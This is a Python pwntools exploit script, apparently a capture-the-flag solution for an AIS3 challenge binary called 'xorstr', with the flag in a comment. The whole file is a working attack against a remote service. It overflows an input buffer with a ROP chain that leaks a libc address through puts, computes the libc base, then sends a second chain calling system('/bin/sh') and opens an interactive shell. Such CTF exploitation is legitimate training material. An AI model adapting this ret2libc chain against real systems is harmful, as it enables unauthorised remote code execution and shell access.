#!/usr/bin/env python
# -*- coding: ascii -*-
from pwn import *

# ais3{xxXxXxxXx00oOo0OOorRrrRRrrr}

e = ELF('xorstr')
l = ELF('libc.so.6')
context.arch = 'amd64'
#y = process( './secretgarden' , env = {'LD_PRELOAD':'./libc_64.so.6'} )
#print util.proc.pidof(y)

host , port = '10.13.2.43' , 30739
#host , port = '192.168.78.141' , 4000
y = remote( host , port )

puts_plt = 0x400650
pop_rdi = 0x400a23
main = 0x40099c

p = flat(
    pop_rdi,
    e.got['__libc_start_main'],
    e.plt['puts'],
    main
)


y.sendafter( 'string:' , '\xf1' + 'a' * 0x7 + p )
sleep(0.2)
y.sendafter( 'xor :' , 'a' * 128  )
sleep(0.2)
y.recvuntil('\x90')


l.address += u64( y.recv(6).ljust( 8 , '\x00' ) ) - l.symbols['__libc_start_main']
log.success( 'Libc base -> {}'.format( hex( l.address ) ) )


y.sendafter( 'string:' , '\xb2\x43' * 1 + 'B' * 0x6 + p + '\xc1' * ( 128 - len(p) - 8 ) )
sleep(0.2)
y.sendafter( 'xor :' , 'B' * 128  )
sleep(0.2)

p = flat(
    main,
    pop_rdi,
    l.search('/bin/sh\x00').next(),
    l.symbols['system']
)

y.sendafter( 'string:' , '\xb2\x43' * 1 + 'B' * 0x6 + p + '\xc1' * ( 128 - len(p) - 8 ) )
sleep(0.2)
y.sendafter( 'xor :' , 'B' * 128  )
sleep(0.2)





y.interactive()